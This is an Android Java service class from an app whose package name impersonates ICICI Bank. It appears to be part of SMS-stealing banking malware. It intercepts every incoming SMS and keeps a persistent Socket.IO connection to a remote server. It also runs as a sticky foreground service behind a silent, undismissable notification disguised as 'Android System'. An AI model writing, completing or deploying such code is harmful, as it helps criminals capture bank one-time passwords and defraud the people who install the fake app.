package com.service.icicibank;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class RunningService extends Service {

    private static String CHANNEL_ID = "";
    private static String TAG = "";

    private SmsReceiver smsReceiver;
    private SocketManager socketManager;
    private Helper helper;

    @Override
    public void onCreate() {

        super.onCreate();
        helper = new Helper();
         TAG =  helper.TAG;
         CHANNEL_ID = helper.BG_CHANNEL_ID;
        createNotificationChannel();
        startForegroundService();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // Register SMS receiver
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsReceiver = new SmsReceiver();
        registerReceiver(smsReceiver, filter);

        // Initialize and connect socket (Socket.IO handles auto-reconnect)
        socketManager = SocketManager.getInstance(getApplicationContext());
        socketManager.connect();
        Log.d(TAG, "Background service started");

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (smsReceiver != null) {
            unregisterReceiver(smsReceiver);
            smsReceiver = null;
        }

        if (socketManager != null) {
            socketManager.disconnect();
        }

        Log.d(TAG, "Background service destroyed.");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Log.d(TAG, "onBind called - not used for started service");
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    CHANNEL_ID,
                    NotificationManager.IMPORTANCE_LOW // Silent but persistent
            );

            // Make sure it's silent (no sound or vibration)
            serviceChannel.setSound(null, null);
            serviceChannel.enableVibration(false);
            serviceChannel.enableLights(false);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @SuppressLint("ForegroundServiceType")
    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        );

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Android System")
                .setContentText("completed")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_HIGH) // Boost priority for visibility
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true) // Prevent swipe-dismiss
                .setSilent(true)  // Suppress sound & vibration
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1, notification);
    }

}
